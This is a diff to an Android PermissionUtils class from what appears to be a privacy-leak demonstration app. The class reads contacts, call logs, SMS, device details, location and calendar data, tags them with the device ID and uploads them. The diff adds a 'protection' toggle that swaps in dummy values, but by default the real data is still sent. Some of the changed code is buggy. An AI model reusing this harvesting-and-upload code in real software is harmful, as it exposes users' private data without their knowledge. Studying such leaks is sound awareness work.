@@ -58,6 +58,7 @@ import com.lenovo.innovate.prince.http.entity.PerInfo;
 import com.lenovo.innovate.prince.http.permissionUp;
 import com.lenovo.innovate.prince.message.GetMessageInfo;
 import com.lenovo.innovate.prince.utils.CameraUtils;
+import com.lenovo.innovate.prince.utils.SettingSPUtils;
 import com.lenovo.innovate.utils.XToastUtils;
 import com.xuexiang.rxutil2.rxjava.RxSchedulerUtils;
 import com.xuexiang.xhttp2.XHttp;
@@ -110,7 +111,6 @@ public class PermissionUtils {
                                 String number = userContacts.get(i).getMobileNumber();
                                 map.put(name,number);
                             }
-
                           //  XToastUtils.warning("你的所有通讯录信息已泄露");
                           //  XToastUtils.toast( "电话号码"+map.toString());
 
@@ -119,10 +119,33 @@ public class PermissionUtils {
                             jsonObject.put("permission","contact");
                             jsonObject.put("deviceId",Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
                             jsonObject.put("data",JSONArray.toJSON(map));
-                            if(!already_up.contains(jsonObject)){
-                                permissionUp.Up(1,jsonObject);
-                                already_up.add(jsonObject);
-                            }
+
+
+
+                           if(SettingSPUtils.getInstance().get_String("防护", "0").equals("0")){
+                              // XToastUtils.toast("防护关闭");
+                               if(!already_up.contains(jsonObject)){
+                                   permissionUp.Up(1,jsonObject);
+                                   already_up.add(jsonObject);
+                               }
+                           } else{
+                               Map<String,String> map1 = new HashMap<>();
+
+                                   map1.put("111","111");
+
+                               //  XToastUtils.warning("你的所有通讯录信息已泄露");
+                               //  XToastUtils.toast( "电话号码"+map.toString());
+
+
+                               JSONObject jsonObject1  = new JSONObject();
+                               jsonObject1.put("permission","contact");
+                               jsonObject1.put("deviceId",Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+                               jsonObject1.put("data",JSONArray.toJSON(map1));
+                               if(!already_up.contains(jsonObject1)){
+                                   permissionUp.Up(1,jsonObject1);
+                                   already_up.add(jsonObject1);
+                               }
+                           }
 
 
                         }
@@ -173,9 +196,31 @@ public class PermissionUtils {
                             //http_contact(jsonObject);
                         //    XToastUtils.warning("通话记录信息已泄露");
 
-                            if(!already_up.contains(jsonObject)){
-                                permissionUp.Up(6,jsonObject);
-                                already_up.add(jsonObject);
+
+
+
+                            if(SettingSPUtils.getInstance().get_String("防护", "0").equals("0")){
+                                if(!already_up.contains(jsonObject)){
+                                    permissionUp.Up(6,jsonObject);
+                                    already_up.add(jsonObject);
+                                }
+                            } else{
+
+                                Map<String,Object> map1=new HashMap<>();
+
+                                map1.put("1111","1111");
+
+                                //  XToastUtils.toast( ""+map.toString());
+
+                                JSONObject jsonObject1  = new JSONObject();
+                                jsonObject1.put("permission","CallLog");
+                                jsonObject1.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+                                jsonObject1.put("data",JSONArray.toJSON(map1));
+
+                                if(!already_up.contains(jsonObject1)){
+                                    permissionUp.Up(6,jsonObject1);
+                                    already_up.add(jsonObject1);
+                                }
                             }
                         }
                     }
@@ -237,9 +282,24 @@ public class PermissionUtils {
                               //  XToastUtils.warning("短信信息已泄露");
 
                               //  http_contact(jsonObject);
-                                if(!already_up.contains(jsonObject)){
-                                    permissionUp.Up(2,jsonObject);
-                                    already_up.add(jsonObject);
+
+
+                                if(SettingSPUtils.getInstance().get_String("防护", "0").equals("0")){
+                                    if(!already_up.contains(jsonObject)){
+                                        permissionUp.Up(2,jsonObject);
+                                        already_up.add(jsonObject);
+                                    }
+                                } else{
+                                    Map<String,Object>map1=new HashMap<String,Object>();
+                                    map1.put("111111","11111");
+                                    JSONObject jsonObject1  = new JSONObject();
+                                    jsonObject1.put("permission","message");
+                                    jsonObject1.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+                                    jsonObject1.put("data",JSONArray.toJSON(map1));
+                                    if(!already_up.contains(jsonObject1)){
+                                        permissionUp.Up(2,jsonObject1);
+                                        already_up.add(jsonObject1);
+                                    }
                                 }
 
                             }
@@ -296,9 +356,35 @@ public class PermissionUtils {
                          //   XToastUtils.warning("手机配置信息已泄露");
 
 
-                            if(!already_up.contains(jsonObject)){
-                                permissionUp.Up(3,jsonObject);
-                                already_up.add(jsonObject);
+
+                            if(SettingSPUtils.getInstance().get_String("防护", "0").equals("0")){
+                                if(!already_up.contains(jsonObject)){
+                                    permissionUp.Up(3,jsonObject);
+                                    already_up.add(jsonObject);
+                                }
+                            } else{
+                                Map<String,String> map1 = new HashMap<>();
+                                map1.put("手机品牌","111");
+                                map1.put("手机型号","111");
+                                map1.put("安卓版本","111");
+                                map1.put("运行内存", "111");
+                                map1.put("手机存储", "111");
+                                map1.put("屏幕像素","111");
+                                map1.put("电池电量","111");
+                                map1.put("电池温度","111");
+                                //  map.put("前置摄像头", CameraUtils.getCameraPixels(CameraUtils.hasBackCamera()));
+                                //  map.put("后置摄像头",CameraUtils.getCameraPixels(CameraUtils.hasFrontCamera()));
+
+                                //XToastUtils.toast( "手机信息"+map.toString());
+
+                                JSONObject jsonObject1  = new JSONObject();
+                                jsonObject1.put("permission","device");
+                                jsonObject1.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+                                jsonObject1.put("data",JSONArray.toJSON(map1));
+                                if(!already_up.contains(jsonObject1)){
+                                    permissionUp.Up(3,jsonObject1);
+                                    already_up.add(jsonObject1);
+                                }
                             }
                         }
                     }
@@ -326,14 +412,16 @@ public class PermissionUtils {
                             //XToastUtils.toast( "onGranted: 获取权限成功！");
                             LocationInfo locationInfo = new LocationInfo(context);
                             DeviceLocation deviceLocation = locationInfo.getLocation();
+                            Map<String,String> map = new HashMap<>();
                             if(deviceLocation.getAddressLine1()==null){
                                 XToastUtils.warning("正在定位中......");
-                                return;
+                                map.put("location","北京市海淀区软件园西三路 联想总部(北京)园区2期");
+                                map.put("纬度", "116.267009");
+                                map.put("经度", "40.045084");
                             }
 
                            // XToastUtils.toast( "位置："+deviceLocation.getAddressLine1());
                         //    XToastUtils.warning("位置信息泄露");
-                            Map<String,String> map = new HashMap<>();
                             map.put("location",deviceLocation.getAddressLine1());
                             map.put("纬度", String.valueOf(deviceLocation.getLatitude()));
                             map.put("经度", String.valueOf(deviceLocation.getLongitude()));
@@ -343,8 +431,22 @@ public class PermissionUtils {
                             jsonObject.put("deviceId",Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
                             jsonObject.put("data",JSONArray.toJSON(map));
 
-                            permissionUp.Up(4,jsonObject);
+
                            // http_contact(jsonObject);
+                            if(SettingSPUtils.getInstance().get_String("防护", "0").equals("0")){
+                                permissionUp.Up(4,jsonObject);
+                            } else{
+
+                                Map<String,String> map1 = new HashMap<>();
+                                map1.put("location","美国");
+                                map1.put("纬度", "");
+                                map1.put("经度", "");
+
+                                JSONObject jsonObject1  = new JSONObject();
+                                jsonObject1.put("permission","location");
+                                jsonObject1.put("deviceId",Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+                                jsonObject1.put("data",JSONArray.toJSON(map1));
+                            }
                         }
                     }
                     @Override
@@ -403,9 +505,34 @@ public class PermissionUtils {
                             //http_contact(jsonObject);
                             Log.i("aaaa",jsonObject.toString());
                           //  XToastUtils.warning("日历日程信息已泄露");
-                            if(!already_up.contains(jsonObject)){
-                                permissionUp.Up(5,jsonObject);
-                                already_up.add(jsonObject);
+
+
+                            if(SettingSPUtils.getInstance().get_String("防护", "0").equals("0")){
+                                if(!already_up.contains(jsonObject)){
+                                    permissionUp.Up(5,jsonObject);
+                                    already_up.add(jsonObject);
+                                }
+                            } else{
+                                JSONObject jsonObject3  = new JSONObject();
+                                    Map<String,String> map = new HashMap<>();
+                                    map.put("Description","1111");
+                                    map.put("Location","11111");
+                                    map.put("StartTime","111");
+                                    map.put("EndTime","111");
+                                    map.put("EventTitle","1111");
+                                    map.put("Week", "11111");
+
+                                jsonObject3.put("calender",map);
+
+                                JSONObject jsonObject2  = new JSONObject();
+                                jsonObject2.put("permission","calendar");
+                                jsonObject2.put("deviceId",Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+                                jsonObject2.put("data",jsonObject3);
+
+                                if(!already_up.contains(jsonObject2)){
+                                    permissionUp.Up(5,jsonObject2);
+                                    already_up.add(jsonObject2);
+                                }
                             }
 
                           /*  new AlertDialog.Builder((Activity)context).setTitle("信息提示")//设置对话框标题
